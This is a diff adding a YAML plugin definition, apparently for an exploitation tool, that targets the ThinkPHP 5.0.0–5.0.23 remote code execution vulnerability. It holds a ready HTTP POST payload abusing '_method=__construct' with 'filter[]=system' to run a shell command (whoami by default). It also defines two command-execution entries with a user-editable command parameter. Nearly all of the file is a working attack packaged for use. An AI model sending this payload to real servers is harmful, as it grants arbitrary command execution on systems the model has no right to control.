@@ -1,0 +1,45 @@
+info:
+    app: ThinkPHP
+    name: ThinkPHP5_0_x
+    author: lz520520
+    plugin_version: 1.0.0
+    disclosure_date: "2019-01-14"
+    create_date: ""
+    update_date: ""
+    scope: "thinkphp 5.0.0-5.0.23"
+    description: |
+        2019 年 1 月 11 日，ThinkPHP 团队发布了一个补丁更新，修复了一处由于不安全的动态函数调用导致的远程代码执行漏洞。该漏洞危害程度非常高，默认条件下即可执行远程代码。对 ThinkPHP 的多个版本进行源码分析和验证后，确认具体受影响的版本为 ThinkPHP5.0-5.0.23 完整版。
+    detail: |
+        http://www.thinkphp.com/thinkphp/public/index.php
+        目前只支持RCE
+        payload里的method参数可以省略
+    payload: |
+        POST /tp5.0.22/public/ HTTP/1.1
+        Host: 192.168.111.111
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+        Connection: close
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 76
+
+        _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoami
+    reference: ""
+payloads:
+    - name: 1
+      alias: 命令执行1
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            tips: whoami
+            default_value: whoami
+            required: true
+    - name: 1
+      alias: 命令执行2
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            tips: whoami
+            default_value: whoami
+            required: true
